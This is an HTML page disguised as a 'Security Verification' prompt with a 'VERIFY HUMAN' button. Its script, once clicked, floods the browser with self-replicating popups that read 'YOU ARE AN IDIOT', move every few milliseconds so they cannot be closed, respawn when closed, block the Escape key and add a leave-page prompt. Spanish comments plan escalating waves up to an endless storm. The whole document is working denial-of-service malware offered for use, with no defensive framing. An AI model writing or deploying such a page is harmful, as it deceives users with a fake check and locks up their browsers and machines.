<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    background:#1a1a2e;
    font-family:'Segoe UI',Arial,sans-serif;
    overflow:hidden;
    width:100vw;
    height:100vh;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    color:#fff;
}
.container{
    text-align:center;
    max-width:600px;
    padding:40px;
    border:1px solid #333;
    border-radius:12px;
    background:#16213e;
    box-shadow:0 0 40px rgba(0,0,0,0.5);
}
h1{
    font-size:2.5rem;
    margin-bottom:10px;
    color:#e94560;
    font-weight:300;
}
p{
    color:#aaa;
    margin-bottom:30px;
    font-size:1.1rem;
    line-height:1.6;
}
.btn{
    display:inline-block;
    padding:15px 50px;
    font-size:1.2rem;
    background:#e94560;
    color:#fff;
    border:none;
    border-radius:8px;
    cursor:pointer;
    transition:all 0.3s;
    position:relative;
    z-index:1000;
    text-decoration:none;
    font-weight:600;
    letter-spacing:1px;
}
.btn:hover{
    background:#c73650;
    transform:scale(1.05);
    box-shadow:0 0 30px rgba(233,69,96,0.4);
}
.status{
    margin-top:20px;
    font-size:0.9rem;
    color:#555;
    font-family:monospace;
}
</style>
</head>
<body>

<div class="container">
    <h1>🔒 Security Verification</h1>
    <p>Please click the button below to verify you are human.<br>
    This is a one-time verification for secure access.</p>
    <button class="btn" id="triggerBtn">✔ VERIFY HUMAN</button>
    <div class="status" id="statusText">Awaiting verification...</div>
</div>

<script>
// ================================================================
// TÉCNICA: POPUPS HIPERVELOCES + AUTOCLICK + REPLICACIÓN
// ================================================================
// Los popups se mueven a velocidad extrema (intervalos de 1-4ms)
// con cambios de dirección aleatorios cada pocos frames.
// Es imposible hacerles clic porque su posición cambia
// más rápido de lo que el ojo/mouse puede seguir.
// ================================================================

var totalPopups = 0;
var isActive = false;
var MAX_POPUPS = 100000;

// ================================================================
// GENERAR HTML DEL POPUP CON AUTOCLICK Y BAILE RÁPIDO
// ================================================================

function generatePopupHTML(id) {
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>!</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    background:#fff;
    overflow:hidden;
    cursor:none;
    width:100vw;
    height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    font-family:Arial,sans-serif;
}
h2{
    font-size:14px;
    text-align:center;
    animation:blink 0.06s infinite;
    color:#000;
    user-select:none;
}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
</style>
</head>
<body>

<h2>YOU ARE AN IDIOT</h2>

<script>
// ============================================================
// MOVIMIENTO HIPERVELOZ
// ============================================================

var x = Math.random() * (screen.width - 180);
var y = Math.random() * (screen.height - 175);
var dx = (Math.random() - 0.5) * 60;  // Velocidad inicial: ±30px/frame
var dy = (Math.random() - 0.5) * 60;
var frameCount = 0;

function hyperDance() {
    try {
        frameCount++;
        x += dx;
        y += dy;
        
        // Cambiar dirección ALEATORIAMENTE cada 1-3 frames
        if (frameCount % (1 + Math.floor(Math.random() * 3)) === 0) {
            dx = (Math.random() - 0.5) * 80;  // Velocidad: hasta ±40px
            dy = (Math.random() - 0.5) * 80;
        }
        
        // Rebotar en bordes (con rebote violento)
        if (x < 0 || x > screen.width - 180) {
            dx = (Math.random() * 40 + 20) * (dx > 0 ? 1 : -1);
            x = Math.max(0, Math.min(screen.width - 180, x));
        }
        if (y < 0 || y > screen.height - 175) {
            dy = (Math.random() * 40 + 20) * (dy > 0 ? 1 : -1);
            y = Math.max(0, Math.min(screen.height - 175, y));
        }
        
        window.moveTo(Math.round(x), Math.round(y));
        
        // A veces redimensionar para más caos
        if (Math.random() < 0.02) {
            try {
                window.resizeTo(
                    160 + Math.random() * 40,
                    155 + Math.random() * 40
                );
            } catch(e) {}
        }
        
        // Intervalo MUY corto: 1-4ms (máxima velocidad)
        setTimeout(hyperDance, 1 + Math.floor(Math.random() * 3));
        
    } catch(e) {
        setTimeout(hyperDance, 10);
    }
}

// Iniciar baile inmediatamente
hyperDance();

// ============================================================
// ABRIR OTRO POPUP DESDE AQUÍ
// ============================================================

function spawnAnother() {
    try {
        var name = 's' + Date.now() + '_' + Math.random().toString(36).substr(2,8);
        var p = window.open('about:blank', name,
            'width=' + (160 + Math.random()*40) + 
            ',height=' + (155 + Math.random()*40) + 
            ',left=' + Math.random()*screen.width + 
            ',top=' + Math.random()*screen.height);
        
        if (p && !p.closed) {
            p.document.write('<!DOCTYPE html><html><head><title>!</title><style>*{margin:0;padding:0}body{background:#fff;overflow:hidden;cursor:none;width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial}h2{font-size:14px;text-align:center;animation:b 0.06s infinite;color:#000}@keyframes b{0%,100%{opacity:1}50%{opacity:0}}<\/style></head><body><h2>YOU ARE AN IDIOT</h2><script>var x=Math.random()*(screen.width-180),y=Math.random()*(screen.height-175);var dx=(Math.random()-0.5)*80,dy=(Math.random()-0.5)*80;setInterval(function(){try{x+=dx;y+=dy;if(Math.random()<0.2){dx=(Math.random()-0.5)*80;dy=(Math.random()-0.5)*80}if(x<0||x>screen.width-180)dx*=-1;if(y<0||y>screen.height-175)dy*=-1;window.moveTo(Math.round(x),Math.round(y))}catch(e){}},1+Math.floor(Math.random()*3));<\/script></body></html>');
            p.document.close();
        }
    } catch(e) {}
}

// Autoclick: abrir más popups inmediatamente
spawnAnother();
setTimeout(spawnAnother, 5);
setTimeout(spawnAnother, 10);
setTimeout(spawnAnother, 15);
setTimeout(spawnAnother, 20);

// Seguir abriendo cada 10-20ms
setInterval(spawnAnother, 10 + Math.floor(Math.random() * 10));

// ============================================================
// AL CERRAR, ABRIR MÁS (procreate)
// ============================================================

window.onunload = function() {
    for (var i = 0; i < 10; i++) {
        setTimeout(function() {
            try {
                var pp = window.open('about:blank', 'f'+Date.now()+Math.random(),
                    'width=180,height=175,left='+Math.random()*screen.width+
                    ',top='+Math.random()*screen.height);
                if (pp && !pp.closed) {
                    pp.document.write('<html><body style="margin:0;overflow:hidden"><script>setInterval(function(){try{window.moveTo(Math.random()*(screen.width-180),Math.random()*(screen.height-175))}catch(e){}},1);<' + '/script></body></html>');
                    pp.document.close();
                }
            } catch(e) {}
        }, i*5);
    }
};

<\/script>

</body>
</html>`;
}

// ================================================================
// ABRIR UN POPUP HIPERVELOZ
// ================================================================

function openHyperPopup() {
    if (totalPopups >= MAX_POPUPS) return null;
    
    try {
        var name = 'p' + Date.now() + '_' + totalPopups + '_' + Math.random().toString(36).substr(2,6);
        var p = window.open('about:blank', name,
            'width=' + (160 + Math.random()*40) + 
            ',height=' + (155 + Math.random()*40) + 
            ',left=' + Math.random()*screen.width + 
            ',top=' + Math.random()*screen.height +
            ',menubar=no,toolbar=no,status=no,resizable=yes,scrollbars=no');
        
        if (p && !p.closed) {
            totalPopups++;
            p.document.write(generatePopupHTML(totalPopups));
            p.document.close();
            
            // Actualizar contador
            document.getElementById('statusText').textContent = 
                'Active popups: ' + totalPopups;
            
            return p;
        }
    } catch(e) {}
    
    return null;
}

// ================================================================
// LANZAMIENTO MASIVO
// ================================================================

function launchStorm() {
    // FASE 1: 200 popups inmediatos (aprovechando transient activation)
    for (var i = 0; i < 200; i++) {
        setTimeout(function() { openHyperPopup(); }, i * 3);
    }
    
    // FASE 2: 1000 más (5 por ms)
    setTimeout(function() {
        for (var i = 0; i < 1000; i++) {
            setTimeout(function() { openHyperPopup(); }, i * 2);
        }
    }, 3000);
    
    // FASE 3: 5000 más
    setTimeout(function() {
        for (var i = 0; i < 5000; i++) {
            setTimeout(function() { openHyperPopup(); }, i * 1);
        }
    }, 7000);
    
    // FASE 4: REFUERZO INFINITO
    setTimeout(function() {
        // Tormenta continua: 200 popups cada 500ms
        setInterval(function() {
            for (var i = 0; i < 200; i++) {
                setTimeout(function() { openHyperPopup(); }, i * 1);
            }
        }, 500);
        
        // Además, 1 cada 2ms constante
        setInterval(function() {
            openHyperPopup();
        }, 2);
    }, 12000);
}

// ================================================================
// PROCREATE: cuando se cierra la ventana principal
// ================================================================

function procreate() {
    for (var i = 0; i < 50; i++) {
        setTimeout(function() { openHyperPopup(); }, i * 2);
    }
}

// ================================================================
// EVENTO DE CLICK
// ================================================================

document.getElementById('triggerBtn').addEventListener('click', function(e) {
    e.preventDefault();
    
    if (isActive) return;
    isActive = true;
    
    this.textContent = '✔ VERIFIED';
    this.style.background = '#2ecc71';
    this.style.pointerEvents = 'none';
    document.getElementById('statusText').textContent = '✓ Launching...';
    
    // Bloquear cierre
    window.onbeforeunload = function() { return ' '; };
    
    window.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' || e.keyCode === 27) {
            e.preventDefault();
            return false;
        }
    }, true);
    
    window.addEventListener('beforeunload', function() {
        procreate();
    });
    
    // Iniciar tormenta
    launchStorm();
    
    // También abrir popups directos desde el click
    for (var i = 0; i < 100; i++) {
        setTimeout(function() { openHyperPopup(); }, i * 2);
    }
});

console.log('Ready. Click VERIFY HUMAN to start the hyper-velocity popup storm.');
</script>

</body>
</html>
